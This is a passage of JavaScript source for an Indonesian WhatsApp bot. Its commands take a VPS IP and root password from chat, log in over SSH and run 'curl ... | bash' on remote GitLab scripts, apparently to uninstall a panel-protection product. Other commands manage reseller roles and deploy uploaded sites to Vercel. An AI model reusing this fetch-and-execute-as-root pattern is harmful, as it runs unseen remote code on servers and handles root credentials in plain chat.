    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 7...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 7 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 8 By Al Luffy
// ────────────────────────────────
case "uninstallprotect8": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect8 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect8 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect8.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 8...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 8 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 9 By Al Luffy
// ────────────────────────────────
case "uninstallprotect9": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect9 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect9 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect9.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 9...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 9 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 10 By Al Luffy
// ────────────────────────────────
case "uninstallprotect10": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect10 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect10 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect10.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 10...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 10 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 11 By Al Luffy
// ────────────────────────────────
case "uninstallprotect11": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect11 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect11 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect11.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 11...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 11 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 12 By Al Luffy
// ────────────────────────────────
case "uninstallprotect12": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect12 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect12 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect12.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 12...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 12 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 13 By Al Luffy
// ────────────────────────────────
case "uninstallprotect13": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect13 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect13 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect13.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 13...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 13 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 14 By Al Luffy
// ────────────────────────────────
case "uninstallprotect14": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect14 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect14 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect14.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 14...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 14 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 15 By Al Luffy
// ────────────────────────────────
case "uninstallprotect15": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect15 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect15 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect15.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 15...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 15 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect 16 By Al Luffy
// ────────────────────────────────
case "uninstallprotect16": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect16 ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotect16 ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scriptURL = 'https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/alluffyprotect16.sh';

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 16...`, m);

    sshClient.on('ready', () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall sedang berjalan...', m);

        sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
                sshClient.end();
                return Reply(`❌ Gagal mengeksekusi perintah:\n\`${err.message}\``, m);
            }

            let output = '';

            stream.on('data', (data) => {
                output += data.toString();
            });

            stream.stderr.on('data', (data) => {
                output += `\n[ERROR] ${data.toString()}`;
            });

            stream.on('close', () => {
                sshClient.end();
                const cleanOutput = output.trim().slice(-3800) || '(tidak ada output)';
                Reply(`✅ *Uninstall Alluffy Protect 16 selesai!*\n📦 Output terakhir:\n\`\`\`${cleanOutput}\`\`\``, m);
            });
        });
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;
// ────────────────────────────────
// 🔹 Case Uninstall Protect All By Al Luffy
// ────────────────────────────────
case "uninstallprotectall": {
    if (!isCreator && !isOwnerProtect && !isSellerProtect) return Reply('❌ Hanya Creator, Owner Protect, atau Seller Protect yang bisa menggunakan perintah ini!', m);

    if (!text.includes('|')) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotectall ipvps|pwvps*', m);
    const [ipvps, pwvps] = text.split('|').map(a => a.trim());
    if (!ipvps || !pwvps) return Reply('❌ Salah format!\nGunakan seperti ini:\n*uninstallprotectall ipvps|pwvps*', m);

    const { Client: SSHClient } = require('ssh2');
    const sshClient = new SSHClient();

    const scripts = [
        'alluffyprotect1.sh',
        'alluffyprotect2.sh',
        'alluffyprotect3.sh',
        'alluffyprotect4.sh',
        'alluffyprotect5.sh',
        'alluffyprotect6.sh',
        'alluffyprotect7.sh',
        'alluffyprotect8.sh',
        'alluffyprotect9.sh',
        'alluffyprotect10.sh',
        'alluffyprotect11.sh',
        'alluffyprotect12.sh',
        'alluffyprotect13.sh',
        'alluffyprotect14.sh',
        'alluffyprotect15.sh',
        'alluffyprotect16.sh'
    ];

    Reply(`⏳ Menghubungkan ke VPS *${ipvps}* dan mulai proses Uninstall Alluffy Protect 1-16...`, m);

    sshClient.on('ready', async () => {
        Reply('⚙️ Koneksi SSH berhasil! Proses uninstall semua Alluffy Protect sedang berjalan...', m);

        for (let i = 0; i < scripts.length; i++) {
            const script = scripts[i];
            // Menggunakan URL GitLab yang Anda berikan
            const scriptURL = `https://gitlab.com/alluffyofficial/uninstallprotecpanel/-/raw/main/${script}`;
            Reply(`🚀 Memulai uninstall *${script}* (${i + 1}/${scripts.length})...\n🔗 ${scriptURL}`, m);

            await new Promise((resolve) => {
                sshClient.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
                    if (err) {
                        Reply(`❌ Gagal mengeksekusi ${script}:\n\`${err.message}\``, m);
                        return resolve();
                    }

                    let output = '';
                    stream.on('data', (data) => {
                        output += data.toString();
                    });
                    stream.stderr.on('data', (data) => {
                        output += `\n[ERROR] ${data.toString()}`;
                    });
                    stream.on('close', () => {
                        const clean = output.trim().slice(-3800) || '(tidak ada output)';
                        Reply(`✅ *${script} selesai diuninstall!*\n📦 Output terakhir:\n\`\`\`${clean}\`\`\``, m);
                        resolve();
                    });
                });
            });
        }

        sshClient.end();
        Reply('🎉 Semua Uninstall Alluffy Protect 1-16 selesai!', m);
    });

    sshClient.on('error', (err) => {
        Reply(`❌ Gagal terhubung ke VPS!\nPeriksa IP & Password kamu.\n\nError:\n\`${err.message}\``, m);
    });

    sshClient.connect({
        host: ipvps,
        port: 22,
        username: 'root',
        password: pwvps,
        readyTimeout: 20000
    });
}
break;

//========= Tambah Owner Protect =========//
case "addop": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .addop 628xxx`);

  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (ownerDB.owners.includes(target)) return Reply("✅ Sudah jadi Owner Protect.");

  ownerDB.owners.push(target);
  fs.writeFileSync(ownerPath, JSON.stringify(ownerDB, null, 2));
  Reply("✅ Berhasil menambahkan ke Owner Protect.");
}
break;

//========= Hapus Owner Protect =========//
case "delop": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .delop 628xxx`);

  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!ownerDB.owners.includes(target)) return Reply("❌ Bukan Owner Protect.");

  ownerDB.owners = ownerDB.owners.filter(x => x !== target);
  fs.writeFileSync(ownerPath, JSON.stringify(ownerDB, null, 2));
  Reply("✅ Berhasil menghapus dari Owner Protect.");
}
break;

//========= List Owner Protect =========//
case "listop": {
  if (!isCreator) return Reply(mess.owner);
  if (ownerDB.owners.length === 0) return Reply("📭 Belum ada Owner Protect terdaftar.");

  let teks = "👑 *Daftar Owner Protect:*\n\n";
  ownerDB.owners.forEach((u, i) => {
    teks += `${i + 1}. @${u.split('@')[0]}\n`;
  });

  Reply(teks);
}
break;

//========= Reset Owner Protect =========//
case "resetop": {
  if (!isCreator) return Reply(mess.owner);
  if (ownerDB.owners.length === 0) return Reply("📭 Tidak ada data Owner Protect untuk dihapus.");

  ownerDB.owners = [];
  fs.writeFileSync(ownerPath, JSON.stringify(ownerDB, null, 2));
  Reply("🗑️ Semua Owner Protect berhasil dihapus.");
}
break;

//========= Tambah Seller Protect =========//
case "addsp": {
  if (!isCreator && !isOwnerProtect) return Reply('❌ Hanya Creator atau Owner Protect yang bisa menambahkan Seller Protect.');
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .addsp 628xxx`);

  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (sellerDB.owners.includes(target)) return Reply("✅ Sudah jadi Seller Protect.");

  sellerDB.owners.push(target);
  fs.writeFileSync(sellerPath, JSON.stringify(sellerDB, null, 2));
  Reply("✅ Berhasil menambahkan ke Seller Protect.");
}
break;

//========= Hapus Seller Protect =========//
case "delsp": {
  if (!isCreator && !isOwnerProtect) return Reply('❌ Hanya Creator atau Owner Protect yang bisa menghapus Seller Protect.');
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .delsp 628xxx`);

  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!sellerDB.owners.includes(target)) return Reply("❌ Bukan Seller Protect.");

  sellerDB.owners = sellerDB.owners.filter(x => x !== target);
  fs.writeFileSync(sellerPath, JSON.stringify(sellerDB, null, 2));
  Reply("✅ Berhasil menghapus dari Seller Protect.");
}
break;

//========= List Seller Protect =========//
case "listsp": {
  if (!isCreator && !isOwnerProtect) return Reply('❌ Hanya Creator atau Owner Protect yang bisa melihat daftar Seller Protect.');
  if (sellerDB.owners.length === 0) return Reply("📭 Belum ada Seller Protect terdaftar.");

  let teks = "🛡️ *Daftar Seller Protect:*\n\n";
  sellerDB.owners.forEach((u, i) => {
    teks += `${i + 1}. @${u.split('@')[0]}\n`;
  });

  Reply(teks);
}
break;

//========= Reset Seller Protect =========//
case "resetsp": {
  if (!isCreator && !isOwnerProtect) return Reply('❌ Hanya Creator atau Owner Protect yang bisa mereset Seller Protect.');
  if (sellerDB.owners.length === 0) return Reply("📭 Tidak ada data Seller Protect untuk dihapus.");

  sellerDB.owners = [];
  fs.writeFileSync(sellerPath, JSON.stringify(sellerDB, null, 2));
  Reply("🗑️ Semua Seller Protect berhasil dihapus.");
}
break;

//=============================================//

case "cweb":
case "createweb": {
    if (!isCreator && !isSellerWeb) return m.reply('❌ Kamu tidak punya akses!');

    if (!text) return m.reply('❗ Masukkan nama web!\nContoh: cweb namaweb');

    if (!qmsg || !/zip|html/.test(qmsg.mimetype)) 
        return m.reply('❗ Balas file .zip atau .html');

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
    const domainCheckUrl = `https://${webName}.vercel.app`;

    // Cek domain sudah dipakai atau belum
    try {
        const check = await fetch(domainCheckUrl);
        if (check.status === 200) 
            return m.reply(`❌ Nama web *${webName}* sudah digunakan, silakan ganti nama lain.`);
    } catch (e) {}

    // Robust downloader: coba beberapa method agar kompatibel dgn berbagai SC/Baileys
    async function getQuotedBuffer(qmsg) {
        if (!qmsg) throw new Error('qmsg kosong');

        // 1) conn.downloadMediaMessage (beberapa SC punya)
        try {
            if (typeof conn.downloadMediaMessage === 'function') {
                const res = await conn.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 2) neo.downloadMediaMessage (jika ada variabel neo di SC)
        try {
            if (typeof neo !== 'undefined' && typeof neo.downloadMediaMessage === 'function') {
                const res = await neo.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 3) downloadContentFromMessage (Baileys helper) - buat stream -> buffer
        try {
            if (typeof downloadContentFromMessage === 'function') {
                // tentukan mtype
                const mtype = qmsg.mtype || (qmsg.message && Object.keys(qmsg.message)[0]) || 'document';
                const stream = await downloadContentFromMessage(qmsg.message || qmsg, mtype);
                const buffer = [];
                for await (const chunk of stream) buffer.push(chunk);
                return Buffer.concat(buffer);
            }
        } catch (e) { /* ignore and try next */ }

        // 4) jika qmsg sudah Buffer / base64
        try {
            if (Buffer.isBuffer(qmsg)) return qmsg;
            if (typeof qmsg === 'string' && /^[A-Za-z0-9+/=]+\s*$/.test(qmsg)) {
                return Buffer.from(qmsg, 'base64');
            }
        } catch (e) {}

        throw new Error('Tidak dapat mendownload media: downloader tidak tersedia di environment ini.');
    }

    let quotedFile;
    try {
        quotedFile = await getQuotedBuffer(qmsg);
    } catch (err) {
        console.error('Download media error:', err);
        return m.reply(`❌ Gagal mendownload file: ${err.message}`);
    }

    const filesToUpload = [];

    // ================= ZIP PROCESS ====================
    if (qmsg.mimetype.includes('zip')) {
        const unzipper = require('unzipper');
        const zipBuffer = Buffer.from(quotedFile);

        let directory;
        try {
            directory = await unzipper.Open.buffer(zipBuffer);
        } catch (err) {
            return m.reply("❌ ZIP error: File ZIP rusak atau tidak bisa dibaca.");
        }

        for (const file of directory.files) {
            if (file.type !== 'File') continue; // skip folder

            let content;
            try {
                content = await file.buffer();
            } catch {
                continue;
            }

            if (!file.path) continue;

            const safePath = file.path
                .replace(/^\/*/, "")     // buang slash depan
                .replace(/\/{2,}/g, "/") // buang double slash
                .replace(/^\.+/, "");    // fix path traversal

            if (!safePath || safePath.endsWith("/")) continue;

            filesToUpload.push({
                file: safePath,
                data: content.toString('base64'),
                encoding: 'base64'
            });
        }

        if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
            return m.reply('❌ File *index.html* tidak ditemukan dalam ZIP.');
        }

    // ================= HTML FILE ====================
    } else if (qmsg.mimetype.includes('html')) {

        filesToUpload.push({
            file: 'index.html',
            data: Buffer.from(quotedFile).toString('base64'),
            encoding: 'base64'
        });

    } else {
        return m.reply('❌ File tidak dikenali. Kirim file .zip atau .html.');
    }

    // HEADER VERCEL
    const headers = {
        Authorization: `Bearer ${global.vercelToken}`,
        'Content-Type': 'application/json'
    };

    // BUAT PROJECT (ignore error jika sudah ada)
    await fetch('https://api.vercel.com/v9/projects', {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: webName })
    }).catch(() => {});

    // DEPLOY
    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            name: webName,
            project: webName,
            files: filesToUpload,
            projectSettings: { framework: null }
        })
    });

    const deployData = await deployRes.json().catch(() => null);
    if (!deployData || !deployData.url) {
        console.log('Deploy Error:', deployData);
        return m.reply(`❌ Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`);
    }

    // SUKSES
    m.reply(`✅ *Website berhasil dibuat!*\n\n🌐 URL: https://${webName}.vercel.app`);
}
break;

//=============================================//

case "createweb2":
case "cweb2": {
    if (!isCreator && !isSellerWeb) return m.reply(mess.slr);
    if (!text) return m.reply("<namaWeb>");
    if (!m.quoted) return m.reply("❗ Balas file .zip atau .html dengan command ini!");

    const qmsg = m.quoted;
